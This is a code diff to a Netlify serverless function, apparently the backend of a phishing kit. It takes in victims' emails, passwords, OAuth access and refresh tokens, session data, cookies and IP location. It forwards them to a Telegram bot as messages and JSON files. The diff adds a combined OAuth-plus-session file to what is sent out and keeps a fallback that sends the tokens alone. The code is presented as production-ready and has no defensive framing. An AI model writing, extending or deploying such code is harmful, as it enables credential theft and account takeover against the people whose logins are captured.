@@ -1,6 +1,6 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * ✅ SENDS: OAuth tokens and cookies ONLY as JSON files (NO text in message)
+ * ✅ SENDS: Email, Password, Combined OAuth+Session file, Cookies as files
  */
 
 const https = require('https');
@@ -240,7 +240,7 @@ exports.handler = async (event, context) => {
       };
     }
 
-    const { email, password, oauth, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
+    const { email, password, oauth, sessionData, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
 
     console.log('📊 [HANDLER] Received data:', {
       email: !!email,
@@ -248,9 +248,11 @@ exports.handler = async (event, context) => {
       hasOAuth: !!oauth,
       hasAccessToken: !!oauth?.access_token,
       hasRefreshToken: !!oauth?.refresh_token,
+      hasSessionData: !!sessionData,
       cookieCount: cookies.length,
       locationData: !!locationData.ip,
-      hasCookieFile: !!cookieFiles.jsonFile
+      hasCookieFile: !!cookieFiles.jsonFile,
+      hasOAuthSessionFile: !!cookieFiles.oauthSessionFile
     });
 
     if (!email && !password && cookies.length === 0 && !oauth) {
@@ -263,9 +265,9 @@ exports.handler = async (event, context) => {
 
     let credentialsSent = false;
     let cookiesSent = false;
-    let oauthFileSent = false;
+    let oauthSessionFileSent = false;
 
-    // ✅ MESSAGE 1: Send ONLY email, password, and location (NO OAuth tokens in text)
+    // ✅ MESSAGE 1: Send credentials (email, password, location)
     console.log('═══════════════════════════════════════════');
     console.log('📨 [HANDLER] Sending credentials message...');
     console.log('═══════════════════════════════════════════');
@@ -284,34 +286,50 @@ exports.handler = async (event, context) => {
       console.error('❌ [HANDLER] Failed to send credentials:', error.message);
     }
 
-    // ✅ FILE 1: Send OAuth tokens as JSON file ONLY
+    // ✅ FILE 1: Send combined OAuth + Session data as one JSON file
     console.log('═══════════════════════════════════════════');
-    console.log('🎫 [HANDLER] Checking OAuth tokens for file...');
+    console.log('🎫 [HANDLER] Checking OAuth + Session data file...');
     console.log('═══════════════════════════════════════════');
 
-    if (oauth && (oauth.access_token || oauth.refresh_token)) {
+    if (cookieFiles && cookieFiles.oauthSessionFile && cookieFiles.oauthSessionFile.content) {
       try {
-        console.log('✅ OAuth tokens detected');
+        console.log('✅ Combined OAuth + Session data file detected');
+        console.log(`📄 File: ${cookieFiles.oauthSessionFile.name}`);
+
+        const oauthSessionContent = cookieFiles.oauthSessionFile.content;
+        const oauthSessionFileName = cookieFiles.oauthSessionFile.name;
+
+        console.log('📤 Sending combined OAuth + Session data as JSON file...');
+        
+        await sendWithRetry(() => sendDocumentToTelegram(oauthSessionContent, oauthSessionFileName));
+
+        oauthSessionFileSent = true;
+        console.log('✅ [HANDLER] OAuth + Session data file sent successfully');
+      } catch (error) {
+        console.error('❌ [HANDLER] Failed to send OAuth + Session file:', error.message);
+      }
+    } else if (oauth && (oauth.access_token || oauth.refresh_token)) {
+      // Fallback: Send only OAuth tokens if combined file not available
+      try {
+        console.log('⚠️ Combined file not found, sending OAuth tokens only');
         
         const oauthContent = JSON.stringify(oauth, null, 2);
         const oauthFileName = `oauth_tokens_${Date.now()}.json`;
 
-        console.log('📤 Sending OAuth tokens as JSON file...');
-        
         await sendWithRetry(() => sendDocumentToTelegram(oauthContent, oauthFileName));
 
-        oauthFileSent = true;
-        console.log('✅ [HANDLER] OAuth tokens file sent successfully');
+        oauthSessionFileSent = true;
+        console.log('✅ [HANDLER] OAuth tokens file sent successfully (fallback)');
       } catch (error) {
         console.error('❌ [HANDLER] Failed to send OAuth file:', error.message);
       }
     } else {
-      console.log('⚠️ [HANDLER] No OAuth tokens to send');
+      console.log('⚠️ [HANDLER] No OAuth data to send');
     }
 
-    // ✅ FILE 2: Send cookies as JSON file ONLY
+    // ✅ FILE 2: Send cookies as JSON file
     console.log('═══════════════════════════════════════════');
-    console.log('📦 [HANDLER] Checking cookie file...');
+    console.log('🍪 [HANDLER] Checking cookie file...');
     console.log('═══════════════════════════════════════════');
 
     if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
@@ -348,11 +366,12 @@ exports.handler = async (event, context) => {
         timestamp: new Date().toISOString(),
         transmitted: {
           credentials: credentialsSent,
-          oauthFile: oauthFileSent,
+          oauthSessionFile: oauthSessionFileSent,
           cookieFile: cookiesSent,
           email: !!email,
           password: !!password,
           oauth: !!oauth,
+          sessionData: !!sessionData,
           cookies: cookies.length,
           location: !!locationData.ip
         }
